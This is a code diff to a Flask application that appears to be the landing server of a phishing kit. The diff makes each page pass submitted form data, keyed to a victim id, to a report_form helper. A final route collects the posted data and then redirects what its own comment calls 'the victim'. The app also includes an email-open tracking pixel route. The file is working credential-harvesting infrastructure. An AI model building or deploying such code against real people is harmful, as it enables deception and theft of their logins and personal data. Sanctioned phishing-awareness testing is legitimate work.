@@ -1,14 +1,22 @@
 #!/usr/bin/env python3
 from app import app
 from flask import request, jsonify, render_template, url_for, redirect
-from helper.functions import report_action
+from helper.functions import report_action, report_form
 
+# first 4 urls can be custom set by user
 url_1 = '$url1'
 url_2 = '$url2'
 url_3 = '$url3'
 url_4 = '$url4'
-url_5 = '$url5'
-rdirect_url = '$redirect_url'
+
+if url_1 == '': url_1 = '/1'
+if url_2 == '': url_2 = '/2' 
+if url_3 == '': url_3 = '/3'
+if url_4 == '': url_4 = '/4'
+
+# 5th url is just there to collet posted data and then redirect the victim
+url_5 = '%s/%s' % (url_4, '2')
+redirect_url = '$redirect_url'
 
 
 @app.route('/<path:tracker>')
@@ -32,48 +40,62 @@ def url1():
     )
 
 
-@app.route(url_2, methods=['POST'])
+@app.route(url_2, methods=['GET', 'POST'])
 def url2():
     id = request.args.get('id')
-    if request.form:
-        pass
-       # TODO - send form data to server
-    return render_template(
-        '2.html',
-        next_url = url_for('url3', id=id)
-    )
+    if request.form and id:
+        report_form(id, request.form)
 
-@app.route(url_3, methods=['POST'])
+    try:
+        return render_template(
+            '2.html',
+            next_url = url_for('url3', id=id)
+        )
+    except:
+        return redirect(redirect_url)
+    
+
+    
+
+
+@app.route(url_3, methods=['GET', 'POST'])
 def url3():
     id = request.args.get('id')
-    if request.form:
-        pass
-       # TODO - send form data to server
-    return render_template(
-        '3.html'
-    )
+    if request.form and id:
+        report_form(id, request.form)
+
+    try:
+        return render_template(
+            '3.html',
+            next_url = url_for('url4', id=id)
+        )
+    except:
+        return redirect(redirect_url)
 
 
 @app.route(url_4, methods=['GET', 'POST'])
 def url4():
     id = request.args.get('id')
-    if request.form:
-        pass
-       # TODO - send form data to server
-    return render_template(
-        '4.html'
-    )
+    if request.form and id:
+        report_form(id, request.form)
+
+    try:
+        return render_template(
+            '4.html',
+            next_url = url_for('url5', id=id)
+        )
+    except:
+        return redirect(redirect_url)
 
 
 @app.route(url_5, methods=['GET', 'POST'])
 def url5():
     id = request.args.get('id')
-    if request.form:
-        pass
-       # TODO - send form data to server
-    return render_template(
-        '5.html'
-    )
+    if request.form and id:
+        report_form(id, request.form)
+        
+    return redirect(redirect_url)
+
 
 # for tracking email opens
 @app.route('/<tracker>/pixel.png')
